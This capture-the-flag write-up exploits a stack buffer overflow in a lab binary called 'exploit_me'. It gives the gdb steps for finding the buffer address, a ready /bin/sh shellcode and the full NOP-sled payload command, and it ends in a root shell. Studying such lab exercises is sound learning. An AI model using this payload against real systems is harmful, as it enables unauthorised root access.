# Writeup 3

Go back to the last step of [writeup 1](../writeup1.md) and ssh as **zaz**.\
We used an exploit called **ret2libc** but we can use another method to exploit the binary, by injecting a **shellcode**
which will be copy to a buffer on the**stack** and then we can inject the address of this buffer in order to make the
**eip** read it.

## Setup exploit

1. **Get buffer's address on the stack**\
The address is returned by the function **strcpy** in **eax**.
```
(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
(gdb) b *main+49
Breakpoint 1 at 0x8048425
(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaa
Starting program: /home/zaz/exploit_me aaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x08048425 in main ()
(gdb) info reg $eax
eax            0xbffff6b0	-1073744208
```
The address is `0xbffff6b0`.


2. **Get the shellcode**\
We can use the website [https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html) to get a shellcode.\
This one works [https://shell-storm.org/shellcode/files/shellcode-516.html](https://shell-storm.org/shellcode/files/shellcode-516.html).\
`\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`


3. **Create the payload**\
The payload consists in `padding + buffer address + NOP + shellcode`.\
What is NOP ? It stands for "No Operations", basically it is used to make sure that our exploit doesn’t fail,because we won’t always point
to the right address , so we add stuff that doesn’t do anything.\
So with that our shellcode is `python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'`

## Exploit
We can just run:
```
./exploit_me $(python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
# id
uid=0(root) gid=1005(zaz) groups=0(root),1005(zaz)
# whoami
root
```
